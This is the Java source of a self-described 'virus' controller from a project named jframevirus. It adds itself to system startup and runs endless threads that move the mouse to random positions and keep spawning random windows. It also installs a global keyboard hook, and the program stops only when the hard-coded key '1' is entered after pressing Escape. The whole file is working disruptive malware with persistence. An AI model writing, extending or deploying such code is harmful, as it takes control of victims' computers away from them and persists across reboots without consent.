package com.joo.jframevirus;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.joo.jframevirus.autostart.AutoStartManager;
import com.joo.jframevirus.keydialog.FailureException;
import com.joo.jframevirus.keydialog.KeyDialog;

import java.awt.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class MainController {
    private Dimension screenSize;
    private Robot robot;
    private Thread mouseThread,
            jframeThread;
    private KeyDialog keyDialog;
    private volatile boolean paused;

    public static final String KEY = "1";
    public static final Logger LOGGER = Logger.getLogger(MainController.class.getName());

    public MainController() {
        init();
        AutoStartManager.getInstance().addVirusToStartup();
        startMouseMoving();
        startRandomFrame();
        setupWindowListener();
    }

    private void init() {
        screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
        initializeThreads();
        keyDialog = new KeyDialog();
        paused = false;
    }

    private void initializeThreads() {
        initializeMouseThread();
        initializeJFrameThreads();
    }

    private void initializeJFrameThreads() {
        jframeThread = new Thread(() -> {
            // TODO: 5/16/22 Make this a while loop
            while (true) {
                LOGGER.log(Level.INFO, "paused = " + this.isPaused());
                if (!this.isPaused()) {
                    new RandomFrame(screenSize);
                }
            }
        });
    }

    private void initializeMouseThread() {
        mouseThread = new Thread(() -> {
            // TODO: 5/15/22 Make this a while loop
            while (true) {
                if (!this.isPaused()) {
                    robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
                            (int) (Math.random() * screenSize.getHeight()));
                }
            }
        });
    }

    private boolean isPaused() {
        return paused;
    }

    // TODO: 5/15/22 Tst this in windows
    private void setupWindowListener() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
                if (nativeEvent.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
                    LOGGER.log(Level.INFO, "Escape pressed");
                    // Pause the threads
                    pause();
                    // Move the mouse to the center of the screen
                    robot.mouseMove(screenSize.width / 2, screenSize.height / 2);
                    // Show a dialog to get the key
                    virusStopKey();
                }
            }
        });
    }

    private void pause() {
        paused = true;
    }

    private void resume() {
        paused = false;
    }

    public void startMouseMoving() {
        mouseThread.start();
    }

    public void startRandomFrame() {
        jframeThread.start();
    }

    public void virusStopKey() {
        try {
            keyDialog.showDialog();
            // If continue then exit
            LOGGER.log(Level.FINE, "Remove virus from auto start programs");
            AutoStartManager.getInstance().removeVirusFromStartup();
            LOGGER.log(Level.FINE, "Exit...");
            System.exit(0);
        } catch (FailureException e) {
            LOGGER.log(Level.WARNING, "The key is not correct");
            resume();
        }
    }
}
